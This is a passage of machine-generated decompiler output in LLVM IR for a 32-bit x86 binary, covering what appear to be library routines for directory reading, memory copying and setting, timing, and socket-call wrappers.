  %v0_804b1a1 = load i32, i32* @edi, align 4
  %v1_804b1a4 = call i32 @function_804c193(i32 %v0_804b1a1)
  %v0_804b1a9 = load i32, i32* @ebx, align 4
  %v1_804b1ac = call i32 @function_804ae74(i32 %v0_804b1a9)
  br label %dec_label_pc_804b1b4

dec_label_pc_804b1b4:                             ; preds = %dec_label_pc_804b15a, %dec_label_pc_804b16a
  %v0_804b1ba = phi i32 [ -1, %dec_label_pc_804b15a ], [ %v1_804b1ac, %dec_label_pc_804b16a ]
  store i32 %v0_804b14d, i32* @ebx, align 4
  store i32 %v0_804b14c, i32* @esi, align 4
  store i32 %v0_804b14b, i32* @edi, align 4
  ret i32 %v0_804b1ba

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804b1b4, { 1, 0 }
}

define i32 @function_804b1bb(i32 %arg1) local_unnamed_addr {
dec_label_pc_804b1bb:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-124 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804b1bb = load i32, i32* @edi, align 4
  %v0_804b1bd = load i32, i32* @ebx, align 4
  store i32 %v0_804b1bd, i32* %stack_var_-12, align 4
  store i32 0, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-124, align 4
  %v2_804b1cc = inttoptr i32 %arg1 to i8*
  %v3_804b1cc = call i32 @function_804af9d(i8* %v2_804b1cc, i32 67584)
  %v2_804b1d4 = icmp slt i32 %v3_804b1cc, 0
  store i32 %v3_804b1cc, i32* @edi, align 4
  br i1 %v2_804b1d4, label %dec_label_pc_804b2a3, label %dec_label_pc_804b1de

dec_label_pc_804b1de:                             ; preds = %dec_label_pc_804b1bb
  %v0_804b1de = load i32, i32* @ebx, align 4
  %v2_804b1e0 = ptrtoint i32* %stack_var_-100 to i32
  store i32 %v3_804b1cc, i32* %stack_var_-124, align 4
  %v4_804b1e6 = call i32 @function_804cbb6(i32 %v3_804b1cc, i32 %v2_804b1e0, i32 %v0_804b1de, i32 %v0_804b1de)
  %v2_804b1ee = icmp slt i32 %v4_804b1e6, 0
  br i1 %v2_804b1ee, label %dec_label_pc_804b204, label %dec_label_pc_804b1f2

dec_label_pc_804b1f2:                             ; preds = %dec_label_pc_804b1de
  %v0_804b1f7 = load i32, i32* @edi, align 4
  store i32 %v0_804b1f7, i32* %stack_var_-124, align 4
  %v3_804b1f8 = call i32 @function_804adb0(i32 %v0_804b1f7, i32 2, i32 1)
  %v2_804b200 = icmp slt i32 %v3_804b1f8, 0
  %v1_804b202 = icmp eq i1 %v2_804b200, false
  br i1 %v1_804b202, label %dec_label_pc_804b21a, label %dec_label_pc_804b204

dec_label_pc_804b204:                             ; preds = %dec_label_pc_804b1f2, %dec_label_pc_804b1de
  %v0_804b204 = load i32, i32* %stack_var_-124, align 4
  %v1_804b204 = call i32 @function_804b330(i32 %v0_804b204)
  %v1_804b20c = inttoptr i32 %v1_804b204 to i32*
  %v2_804b20c = load i32, i32* %v1_804b20c, align 4
  store i32 %v1_804b204, i32* @ebx, align 4
  %v0_804b210 = load i32, i32* @edi, align 4
  store i32 %v0_804b210, i32* %stack_var_-124, align 4
  %v1_804b211 = call i32 @function_804ae74(i32 %v0_804b210)
  %v1_804b216 = load i32, i32* @ebx, align 4
  %v2_804b216 = inttoptr i32 %v1_804b216 to i32*
  store i32 %v2_804b20c, i32* %v2_804b216, align 4
  br label %dec_label_pc_804b28f

dec_label_pc_804b21a:                             ; preds = %dec_label_pc_804b1f2
  store i32 48, i32* %stack_var_-124, align 4
  %v1_804b21f = call i32 @function_804b6c8(i32 48)
  %v1_804b227 = icmp eq i32 %v1_804b21f, 0
  store i32 %v1_804b21f, i32* @ebx, align 4
  br i1 %v1_804b227, label %dec_label_pc_804b27b, label %dec_label_pc_804b22d

dec_label_pc_804b22d:                             ; preds = %dec_label_pc_804b21a
  %v0_804b22d = load i32, i32* @edi, align 4
  %v2_804b22d = inttoptr i32 %v1_804b21f to i32*
  store i32 %v0_804b22d, i32* %v2_804b22d, align 4
  %v1_804b22f = add i32 %v1_804b21f, 16
  %v2_804b22f = inttoptr i32 %v1_804b22f to i32*
  store i32 0, i32* %v2_804b22f, align 4
  %v1_804b236 = add i32 %v1_804b21f, 8
  %v2_804b236 = inttoptr i32 %v1_804b236 to i32*
  store i32 0, i32* %v2_804b236, align 4
  %v1_804b23d = add i32 %v1_804b21f, 4
  %v2_804b23d = inttoptr i32 %v1_804b23d to i32*
  store i32 0, i32* %v2_804b23d, align 4
  %v1_804b24d = load i32, i32* @ebx, align 4
  %v2_804b24d = add i32 %v1_804b24d, 20
  %v3_804b24d = inttoptr i32 %v2_804b24d to i32*
  store i32 %tmp, i32* %v3_804b24d, align 4
  %v6_804b250 = icmp ugt i32 %tmp, 511
  br i1 %v6_804b250, label %dec_label_pc_804b259, label %dec_label_pc_804b252

dec_label_pc_804b252:                             ; preds = %dec_label_pc_804b22d
  %v0_804b252 = load i32, i32* @ebx, align 4
  %v1_804b252 = add i32 %v0_804b252, 20
  %v2_804b252 = inttoptr i32 %v1_804b252 to i32*
  store i32 512, i32* %v2_804b252, align 4
  br label %dec_label_pc_804b259

dec_label_pc_804b259:                             ; preds = %dec_label_pc_804b22d, %dec_label_pc_804b252
  %v0_804b25b = load i32, i32* @ebx, align 4
  %v1_804b25b = add i32 %v0_804b25b, 20
  %v2_804b25b = inttoptr i32 %v1_804b25b to i32*
  %v3_804b25b = load i32, i32* %v2_804b25b, align 4
  store i32 1, i32* %stack_var_-124, align 4
  %v3_804b260 = call i32 @function_804be6a(i64 1, i32 %v3_804b25b)
  %v1_804b268 = icmp eq i32 %v3_804b260, 0
  %v1_804b26a = load i32, i32* @ebx, align 4
  %v2_804b26a = add i32 %v1_804b26a, 12
  %v3_804b26a = inttoptr i32 %v2_804b26a to i32*
  store i32 %v3_804b260, i32* %v3_804b26a, align 4
  %v1_804b26d = icmp eq i1 %v1_804b268, false
  br i1 %v1_804b26d, label %dec_label_pc_804b293, label %dec_label_pc_804b26f

dec_label_pc_804b26f:                             ; preds = %dec_label_pc_804b259
  %v0_804b272 = load i32, i32* @ebx, align 4
  store i32 %v0_804b272, i32* %stack_var_-124, align 4
  %v1_804b273 = call i32 @function_804c193(i32 %v0_804b272)
  br label %dec_label_pc_804b27b

dec_label_pc_804b27b:                             ; preds = %dec_label_pc_804b21a, %dec_label_pc_804b26f
  %v0_804b27e = load i32, i32* @edi, align 4
  store i32 %v0_804b27e, i32* %stack_var_-124, align 4
  %v1_804b27f = call i32 @function_804ae74(i32 %v0_804b27e)
  %v1_804b284 = call i32 @function_804b330(i32 %v0_804b27e)
  %v1_804b289 = inttoptr i32 %v1_804b284 to i32*
  store i32 12, i32* %v1_804b289, align 4
  br label %dec_label_pc_804b28f

dec_label_pc_804b28f:                             ; preds = %dec_label_pc_804b204, %dec_label_pc_804b27b
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804b2a0

dec_label_pc_804b293:                             ; preds = %dec_label_pc_804b259
  %v0_804b297 = load i32, i32* @ebx, align 4
  %v1_804b297 = add i32 %v0_804b297, 24
  store i32 %v1_804b297, i32* %stack_var_-124, align 4
  %v1_804b29b = call i32 @function_804c7b4(i32 %v1_804b297)
  br label %dec_label_pc_804b2a0

dec_label_pc_804b2a0:                             ; preds = %dec_label_pc_804b28f, %dec_label_pc_804b293
  %v2_804b2a8.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804b2a3

dec_label_pc_804b2a3:                             ; preds = %dec_label_pc_804b1bb, %dec_label_pc_804b2a0
  %v2_804b2a8 = phi i32 [ %v0_804b1bd, %dec_label_pc_804b1bb ], [ %v2_804b2a8.pre, %dec_label_pc_804b2a0 ]
  %v0_804b2a6 = load i32, i32* @ebx, align 4
  store i32 %v2_804b2a8, i32* @ebx, align 4
  store i32 %v0_804b1bb, i32* @edi, align 4
  ret i32 %v0_804b2a6

; uselistorder directives
  uselistorder i32 %v3_804b260, { 1, 0 }
  uselistorder i32 %v1_804b21f, { 2, 3, 5, 4, 0, 1 }
  uselistorder i32 %v1_804b204, { 1, 0 }
  uselistorder i32 %v3_804b1cc, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-124, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 (i64, i32)* @function_804be6a, { 4, 0, 1, 2, 3 }
  uselistorder i32 512, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_804ae74, { 0, 3, 2, 9, 5, 8, 7, 6, 4, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804b2a3, { 1, 0 }
  uselistorder label %dec_label_pc_804b2a0, { 1, 0 }
  uselistorder label %dec_label_pc_804b28f, { 1, 0 }
  uselistorder label %dec_label_pc_804b27b, { 1, 0 }
  uselistorder label %dec_label_pc_804b259, { 1, 0 }
}

define i32 @function_804b2ac() local_unnamed_addr {
dec_label_pc_804b2ac:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804b2ac = load i32, i32* @esi, align 4
  %v0_804b2ad = load i32, i32* @ebx, align 4
  store i32 %v0_804b2ad, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* @esi, align 4
  %v1_804b2b5 = add i32 %tmp, 24
  store i32 %v1_804b2b5, i32* @ebx, align 4
  %v2_804b2be = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804b2be, i32* @eax, align 4
  %v2_804b2c3 = call i32 @function_804c7b7(i32 %v2_804b2be, i32 134530996)
  %v0_804b2c8 = load i32, i32* @ebx, align 4
  %v1_804b2cb = call i32 @function_804c7b4(i32 %v0_804b2c8)
  br label %dec_label_pc_804b2d3

dec_label_pc_804b2d3:                             ; preds = %dec_label_pc_804b2fe, %dec_label_pc_804b2ac
  %v0_804b2d3 = load i32, i32* @esi, align 4
  %v1_804b2d3 = add i32 %v0_804b2d3, 8
  %v2_804b2d3 = inttoptr i32 %v1_804b2d3 to i32*
  %v3_804b2d3 = load i32, i32* %v2_804b2d3, align 4
  %v2_804b2d6 = add i32 %v0_804b2d3, 4
  %v3_804b2d6 = inttoptr i32 %v2_804b2d6 to i32*
  %v4_804b2d6 = load i32, i32* %v3_804b2d6, align 4
  %v6_804b2d9 = icmp ugt i32 %v3_804b2d3, %v4_804b2d6
  br i1 %v6_804b2d9, label %dec_label_pc_804b2fe, label %dec_label_pc_804b2db

dec_label_pc_804b2db:                             ; preds = %dec_label_pc_804b2d3
  %v0_804b2db = load i32, i32* @edx, align 4
  %v1_804b2dc = add i32 %v0_804b2d3, 20
  %v2_804b2dc = inttoptr i32 %v1_804b2dc to i32*
  %v3_804b2dc = load i32, i32* %v2_804b2dc, align 4
  %v1_804b2df = add i32 %v0_804b2d3, 12
  %v2_804b2df = inttoptr i32 %v1_804b2df to i32*
  %v3_804b2df = load i32, i32* %v2_804b2df, align 4
  %v1_804b2e2 = inttoptr i32 %v0_804b2d3 to i32*
  %v2_804b2e2 = load i32, i32* %v1_804b2e2, align 4
  %v4_804b2e4 = call i32 @function_804cbfe(i32 %v2_804b2e2, i32 %v3_804b2df, i32 %v3_804b2dc, i32 %v0_804b2db)
  %tmp12 = icmp slt i32 %v4_804b2e4, 1
  %tmp13 = icmp eq i1 %tmp12, false
  br i1 %tmp13, label %dec_label_pc_804b2f4, label %dec_label_pc_804b2f0

dec_label_pc_804b2f0:                             ; preds = %dec_label_pc_804b2db
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804b31a

dec_label_pc_804b2f4:                             ; preds = %dec_label_pc_804b2db
  %v1_804b2f4 = load i32, i32* @esi, align 4
  %v2_804b2f4 = add i32 %v1_804b2f4, 8
  %v3_804b2f4 = inttoptr i32 %v2_804b2f4 to i32*
  store i32 %v4_804b2e4, i32* %v3_804b2f4, align 4
  %v0_804b2f7 = load i32, i32* @esi, align 4
  %v1_804b2f7 = add i32 %v0_804b2f7, 4
  %v2_804b2f7 = inttoptr i32 %v1_804b2f7 to i32*
  store i32 0, i32* %v2_804b2f7, align 4
  %v0_804b2fe.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804b2fe

dec_label_pc_804b2fe:                             ; preds = %dec_label_pc_804b2d3, %dec_label_pc_804b2f4
  %v1_804b30c = phi i32 [ %v0_804b2d3, %dec_label_pc_804b2d3 ], [ %v0_804b2fe.pre, %dec_label_pc_804b2f4 ]
  %v1_804b2fe = add i32 %v1_804b30c, 4
  %v2_804b2fe = inttoptr i32 %v1_804b2fe to i32*
  %v3_804b2fe = load i32, i32* %v2_804b2fe, align 4
  %v2_804b303 = add i32 %v1_804b30c, 12
  %v3_804b303 = inttoptr i32 %v2_804b303 to i32*
  %v4_804b303 = load i32, i32* %v3_804b303, align 4
  %v5_804b303 = add i32 %v4_804b303, %v3_804b2fe
  store i32 %v5_804b303, i32* @ebx, align 4
  %v1_804b306 = add i32 %v5_804b303, 8
  %v2_804b306 = inttoptr i32 %v1_804b306 to i16*
  %v3_804b306 = load i16, i16* %v2_804b306, align 2
  %v4_804b306 = zext i16 %v3_804b306 to i32
  store i32 %v4_804b306, i32* @edx, align 4
  %v2_804b30a = add i32 %v4_804b306, %v3_804b2fe
  store i32 %v2_804b30a, i32* %v2_804b2fe, align 4
  %v0_804b30f = load i32, i32* @ebx, align 4
  %v1_804b30f = add i32 %v0_804b30f, 4
  %v2_804b30f = inttoptr i32 %v1_804b30f to i32*
  %v3_804b30f = load i32, i32* %v2_804b30f, align 4
  %v1_804b312 = load i32, i32* @esi, align 4
  %v2_804b312 = add i32 %v1_804b312, 16
  %v3_804b312 = inttoptr i32 %v2_804b312 to i32*
  store i32 %v3_804b30f, i32* %v3_804b312, align 4
  %v0_804b315 = load i32, i32* @ebx, align 4
  %v1_804b315 = inttoptr i32 %v0_804b315 to i32*
  %v2_804b315 = load i32, i32* %v1_804b315, align 4
  %v3_804b315 = icmp eq i32 %v2_804b315, 0
  br i1 %v3_804b315, label %dec_label_pc_804b2d3, label %dec_label_pc_804b31a.loopexit

dec_label_pc_804b31a.loopexit:                    ; preds = %dec_label_pc_804b2fe
  br label %dec_label_pc_804b31a

dec_label_pc_804b31a:                             ; preds = %dec_label_pc_804b31a.loopexit, %dec_label_pc_804b2f0
  store i32 %v2_804b2be, i32* @eax, align 4
  %v2_804b323 = call i32 @function_804c7b7(i32 %v2_804b2be, i32 1)
  %v0_804b32b = load i32, i32* @ebx, align 4
  %v2_804b32d = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804b32d, i32* @ebx, align 4
  store i32 %v0_804b2ac, i32* @esi, align 4
  ret i32 %v0_804b32b

; uselistorder directives
  uselistorder i32 %v1_804b30c, { 1, 0 }
  uselistorder i32 %v0_804b2d3, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_804b2fe, { 1, 0 }
}

define i32 @function_804b330(i32 %arg1) local_unnamed_addr {
dec_label_pc_804b330:
  ret i32 ptrtoint (i32* @global_var_804f6d4.76 to i32)
}

define i32 @function_804b336() local_unnamed_addr {
dec_label_pc_804b336:
  %tmp = call i64 @__decompiler_undefined_function_4()
  %stack_var_-16 = alloca i32, align 4
  %v1_804b33e = bitcast i32* %stack_var_-16 to %tms*
  %v2_804b33e = call i32 @function_804cf87(%tms* %v1_804b33e)
  %v4_804b343 = trunc i64 %tmp to i32
  %v4_804b347 = load i32, i32* %stack_var_-16, align 4
  %v5_804b347 = add i32 %v4_804b347, %v4_804b343
  %v3_804b34e = mul i32 %v5_804b347, 10000
  %v1_804b354 = and i32 %v3_804b34e, 2147483632
  ret i32 %v1_804b354

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @function_804b35a(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804b35a:
  %tmp3 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_804b35b = load i32, i32* @esi, align 4
  store i32 %v0_804b35b, i32* %stack_var_-8, align 4
  %v4_804b35c = ptrtoint i8* %arg1 to i32
  %v9_804b368 = icmp ugt i8* %tmp3, %arg1
  %v1_804b36a = icmp eq i1 %v9_804b368, false
  br i1 %v1_804b36a, label %dec_label_pc_804b372, label %dec_label_pc_804b36c

dec_label_pc_804b36c:                             ; preds = %dec_label_pc_804b35a
  %v7_804b36e = call i8* @_memcpy(i8* %arg1, i8* %tmp3, i32 %arg3)
  %v8_804b36e = ptrtoint i8* %v7_804b36e to i32
  store i32 %v8_804b36e, i32* @ecx, align 4
  br label %dec_label_pc_804b37e

dec_label_pc_804b372:                             ; preds = %dec_label_pc_804b35a
  %v3_804b372 = add i32 %arg2, -1
  %v4_804b372 = add i32 %v3_804b372, %arg3
  %v5_804b372 = inttoptr i32 %v4_804b372 to i8*
  %v3_804b376 = add i32 %v4_804b35c, -1
  %v4_804b376 = add i32 %v3_804b376, %arg3
  %v5_804b376 = inttoptr i32 %v4_804b376 to i8*
  %v7_804b37b = call i8* @_memcpy(i8* %v5_804b376, i8* %v5_804b372, i32 %arg3)
  %v8_804b37b = ptrtoint i8* %v7_804b37b to i32
  store i32 %v8_804b37b, i32* @ecx, align 4
  store i1 false, i1* @df, align 1
  br label %dec_label_pc_804b37e

dec_label_pc_804b37e:                             ; preds = %dec_label_pc_804b36c, %dec_label_pc_804b372
  %v2_804b37e = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804b37e, i32* @esi, align 4
  ret i32 %v4_804b35c

; uselistorder directives
  uselistorder i8* %tmp3, { 1, 0 }
  uselistorder i32 %arg3, { 1, 3, 2, 0 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804b37e, { 1, 0 }
}

define i32 @function_804b381(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804b381:
  %v0_804b381 = load i32, i32* @edi, align 4
  %v4_804b38a = ptrtoint i8* %arg1 to i32
  %v5_804b38e = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  %v6_804b38e = ptrtoint i8* %v5_804b38e to i32
  store i32 %v6_804b38e, i32* @ecx, align 4
  store i32 %v0_804b381, i32* @edi, align 4
  ret i32 %v4_804b38a

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @function_804b396(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804b396:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804b3b1 = ptrtoint i32* %stack_var_-12 to i32
  %v2_804b3b8 = call i32 @function_804caef(i32 5, i32 %v2_804b3b1)
  ret i32 %v2_804b3b8

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_804b3c1(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804b3c1:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804b3dc = ptrtoint i32* %stack_var_-12 to i32
  %v2_804b3e3 = call i32 @function_804caef(i32 2, i32 %v2_804b3dc)
  ret i32 %v2_804b3e3

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_804b3ec(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804b3ec:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804b407 = ptrtoint i32* %stack_var_-12 to i32
  %v2_804b40e = call i32 @function_804caef(i32 3, i32 %v2_804b407)
  ret i32 %v2_804b40e

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_804b417(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804b417:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804b432 = ptrtoint i32* %stack_var_-12 to i32
  %v2_804b439 = call i32 @function_804caef(i32 6, i32 %v2_804b432)
  ret i32 %v2_804b439

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_804b442() local_unnamed_addr {
dec_label_pc_804b442:
  %stack_var_-20 = alloca i32, align 4
  %v2_804b46d = ptrtoint i32* %stack_var_-20 to i32
  %v2_804b474 = call i32 @function_804caef(i32 15, i32 %v2_804b46d)
  ret i32 %v2_804b474
}

define i32 @function_804b47d(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804b47d:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-8, align 4
  %v2_804b490 = ptrtoint i32* %stack_var_-8 to i32
  %v2_804b497 = call i32 @function_804caef(i32 4, i32 %v2_804b490)
  ret i32 %v2_804b497

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @function_804b4a0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804b4a0:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_804b4c3 = ptrtoint i32* %stack_var_-16 to i32
  %v2_804b4ca = call i32 @function_804caef(i32 10, i32 %v2_804b4c3)
  ret i32 %v2_804b4ca

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @function_804b4d3() local_unnamed_addr {
dec_label_pc_804b4d3:
  %stack_var_-24 = alloca i32, align 4
  %v2_804b506 = ptrtoint i32* %stack_var_-24 to i32
  %v2_804b50d = call i32 @function_804caef(i32 12, i32 %v2_804b506)
  ret i32 %v2_804b50d
}

define i32 @function_804b516() local_unnamed_addr {
dec_label_pc_804b516:
  %stack_var_-16 = alloca i32, align 4
  %v2_804b539 = ptrtoint i32* %stack_var_-16 to i32
  %v2_804b540 = call i32 @function_804caef(i32 9, i32 %v2_804b539)
  ret i32 %v2_804b540
}

define i32 @function_804b549(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_804b549:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_804b574 = ptrtoint i32* %stack_var_-20 to i32
  %v2_804b57b = call i32 @function_804caef(i32 14, i32 %v2_804b574)
  ret i32 %v2_804b57b

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @function_804b584(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804b584:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804b59f = ptrtoint i32* %stack_var_-12 to i32
  %v2_804b5a6 = call i32 @function_804caef(i32 1, i32 %v2_804b59f)
  ret i32 %v2_804b5a6

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_804caef, { 4, 3, 6, 5, 7, 2, 8, 10, 1, 0, 9 }
}

define i32 @function_804b5af(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804b5af:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_804b5af = load i32, i32* @ebx, align 4
  %v15_804b5b0 = ptrtoint i32* %stack_var_-300 to i32
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v10_804b5c4 = icmp eq i32 %arg2, -1
  br i1 %v10_804b5c4, label %dec_label_pc_804b5d2, label %dec_label_pc_804b5c9

dec_label_pc_804b5c9:                             ; preds = %dec_label_pc_804b5af
  %tmp25 = icmp slt i32 %arg1, 1
  br i1 %tmp25, label %dec_label_pc_804b5d2, label %dec_label_pc_804b5cd

dec_label_pc_804b5cd:                             ; preds = %dec_label_pc_804b5c9
  %v7_804b5d0 = icmp sgt i32 %arg1, 64
  br i1 %v7_804b5d0, label %dec_label_pc_804b5d2, label %dec_label_pc_804b5ed.lr.ph

dec_label_pc_804b5d2:                             ; preds = %dec_label_pc_804b5cd, %dec_label_pc_804b5c9, %dec_label_pc_804b5af
  %v1_804b5d2 = call i32 @function_804b330(i32 %v0_804b5af)
  store i32 %v1_804b5d2, i32* %eax.global-to-local, align 4
  %v1_804b5d7 = inttoptr i32 %v1_804b5d2 to i32*
  store i32 22, i32* %v1_804b5d7, align 4
  br label %dec_label_pc_804b653

dec_label_pc_804b5ed.lr.ph:                       ; preds = %dec_label_pc_804b5cd
  store i32 %arg2, i32* %stack_var_-144, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_804b5ed27 = add i32 %v15_804b5b0, 284
  %v5_804b5ed28 = inttoptr i32 %v4_804b5ed27 to i32*
  store i32 0, i32* %v5_804b5ed28, align 4
  %v0_804b5f829 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b5f830 = add i32 %v0_804b5f829, -1
  %v9_804b5f831 = icmp slt i32 %v1_804b5f830, 0
  store i32 %v1_804b5f830, i32* %eax.global-to-local, align 4
  %v1_804b5f932 = icmp eq i1 %v9_804b5f831, false
  br i1 %v1_804b5f932, label %dec_label_pc_804b5ed.dec_label_pc_804b5ed_crit_edge, label %dec_label_pc_804b5fb

dec_label_pc_804b5ed.dec_label_pc_804b5ed_crit_edge: ; preds = %dec_label_pc_804b5ed.lr.ph, %dec_label_pc_804b5ed.dec_label_pc_804b5ed_crit_edge
  %v1_804b5f833 = phi i32 [ %v1_804b5f8, %dec_label_pc_804b5ed.dec_label_pc_804b5ed_crit_edge ], [ %v1_804b5f830, %dec_label_pc_804b5ed.lr.ph ]
  %v0_804b5ed.pre = load i32, i32* @esp, align 4
  %v2_804b5ed = mul i32 %v1_804b5f833, 4
  %v3_804b5ed = add i32 %v0_804b5ed.pre, 160
  %v4_804b5ed = add i32 %v3_804b5ed, %v2_804b5ed
  %v5_804b5ed = inttoptr i32 %v4_804b5ed to i32*
  store i32 0, i32* %v5_804b5ed, align 4
  %v0_804b5f8 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b5f8 = add i32 %v0_804b5f8, -1
  %v9_804b5f8 = icmp slt i32 %v1_804b5f8, 0
  store i32 %v1_804b5f8, i32* %eax.global-to-local, align 4
  %v1_804b5f9 = icmp eq i1 %v9_804b5f8, false
  br i1 %v1_804b5f9, label %dec_label_pc_804b5ed.dec_label_pc_804b5ed_crit_edge, label %dec_label_pc_804b5fb

dec_label_pc_804b5fb:                             ; preds = %dec_label_pc_804b5ed.dec_label_pc_804b5ed_crit_edge, %dec_label_pc_804b5ed.lr.ph
  %v0_804b5fb = load i32, i32* @edx, align 4
  %v2_804b5fe = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_804b5fe, i32* %eax.global-to-local, align 4
  %v4_804b606 = call i32 @function_804b682(i32 %v2_804b5fe, i32 %arg1, i32 %v0_804b5fb, i32 %v0_804b5fb)
  store i32 %v4_804b606, i32* %eax.global-to-local, align 4
  %v2_804b60e = icmp slt i32 %v4_804b606, 0
  br i1 %v2_804b60e, label %dec_label_pc_804b653, label %dec_label_pc_804b612

dec_label_pc_804b612:                             ; preds = %dec_label_pc_804b5fb
  %v4_804b61a = call i32 @function_804b65e(i32 ptrtoint (i32* @global_var_804f6e0.77 to i32), i32 %arg1, i32 %v4_804b606, i32 %v4_804b606)
  %v2_804b633 = ptrtoint i32* %stack_var_-284 to i32
  %v2_804b638 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_804b638, i32* %eax.global-to-local, align 4
  %v4_804b641 = call i32 @function_804c9f7(i32 %arg1, i32* nonnull %stack_var_-144, i32 %v2_804b633)
  store i32 %v4_804b641, i32* %eax.global-to-local, align 4
  %v2_804b649 = icmp slt i32 %v4_804b641, 0
  br i1 %v2_804b649, label %dec_label_pc_804b653, label %dec_label_pc_804b64d

dec_label_pc_804b64d:                             ; preds = %dec_label_pc_804b612
  %v3_804b64d = load i32, i32* %stack_var_-284, align 4
  br label %dec_label_pc_804b656

dec_label_pc_804b653:                             ; preds = %dec_label_pc_804b612, %dec_label_pc_804b5fb, %dec_label_pc_804b5d2
  br label %dec_label_pc_804b656

dec_label_pc_804b656:                             ; preds = %dec_label_pc_804b64d, %dec_label_pc_804b653
  %storemerge = phi i32 [ -1, %dec_label_pc_804b653 ], [ %v3_804b64d, %dec_label_pc_804b64d ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_804b5f8, { 2, 1, 0 }
  uselistorder i32* %stack_var_-144, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 9, 1, 2, 3, 4, 6, 5, 0, 10, 11, 7, 8 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 3, 2, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_804b656, { 1, 0 }
  uselistorder label %dec_label_pc_804b5ed.dec_label_pc_804b5ed_crit_edge, { 1, 0 }
}

define i32 @function_804b65e(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804b65e:
  %v1_804b66c = add i32 %arg2, -1
  %v1_804b66f = urem i32 %v1_804b66c, 32
  %v2_804b66f = icmp eq i32 %v1_804b66f, 0
  %v2_804b672 = udiv i32 %v1_804b66c, 32
